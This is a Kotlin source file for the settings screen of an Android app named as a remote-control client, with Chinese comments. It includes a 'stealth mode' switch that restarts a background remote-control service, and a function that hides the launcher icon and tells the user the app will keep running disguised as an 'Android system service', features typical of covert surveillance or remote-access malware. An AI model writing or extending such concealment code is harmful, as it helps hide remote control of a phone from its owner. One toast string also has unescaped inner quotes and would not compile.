package com.remotecontrol.client.ui.settings

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.remotecontrol.client.RemoteControlApplication
import com.remotecontrol.client.databinding.ActivitySettingsBinding
import com.remotecontrol.client.ui.auth.LoginActivity
import com.remotecontrol.client.utils.PreferenceManager
import kotlinx.coroutines.launch

class SettingsActivity : AppCompatActivity() {
    
    private lateinit var binding: ActivitySettingsBinding
    private val app by lazy { application as RemoteControlApplication }
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivitySettingsBinding.inflate(layoutInflater)
        setContentView(binding.root)
        
        loadSettings()
        setupClickListeners()
    }
    
    private fun loadSettings() {
        // 加载现有设置
        binding.editServerUrl.setText(PreferenceManager.getServerUrl(this))
        
        // 加载隐蔽模式设置
        binding.switchStealthMode.isChecked = PreferenceManager.isStealthMode(this)
        
        // 显示版本信息
        val versionName = packageManager.getPackageInfo(packageName, 0).versionName
        binding.textVersion.text = getString(R.string.version, versionName)
    }
    
    private fun setupClickListeners() {
        // 现有的点击监听器...
        
        // 添加隐蔽模式开关监听
        binding.switchStealthMode.setOnCheckedChangeListener { _, isChecked ->
            PreferenceManager.setStealthMode(this, isChecked)
            // 如果服务正在运行，重启服务以应用新设置
            val serviceIntent = Intent(this, RemoteControlService::class.java)
            stopService(serviceIntent)
            startForegroundService(serviceIntent)
        }
    }
    
    private fun hideAppIcon() {
        val packageManager = packageManager
        val componentName = ComponentName(this, "com.remotecontrol.client.ui.MainActivity")
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        Toast.makeText(this, "桌面图标已隐藏，应用将以"Android系统服务"的名称在后台运行", Toast.LENGTH_LONG).show()
    }
    
    private fun showAppIcon() {
        val packageManager = packageManager
        val componentName = ComponentName(this, "com.remotecontrol.client.ui.MainActivity")
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
        Toast.makeText(this, "桌面图标已显示", Toast.LENGTH_SHORT).show()
    }
    
    private fun performLogout() {
        lifecycleScope.launch {
            val result = app.userRepository.logout()
            
            result.onSuccess {
                // 清除登录信息
                PreferenceManager.setLoggedIn(this@SettingsActivity, false)
                PreferenceManager.saveToken(this@SettingsActivity, "")
                
                Toast.makeText(this@SettingsActivity, "已退出登录", Toast.LENGTH_SHORT).show()
                
                // 跳转到登录界面
                val intent = Intent(this@SettingsActivity, LoginActivity::class.java)
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
                startActivity(intent)
                finish()
                
            }.onFailure { error ->
                Toast.makeText(this@SettingsActivity, "退出登录失败: ${error.message}", Toast.LENGTH_SHORT).show()
            }
        }
    }
}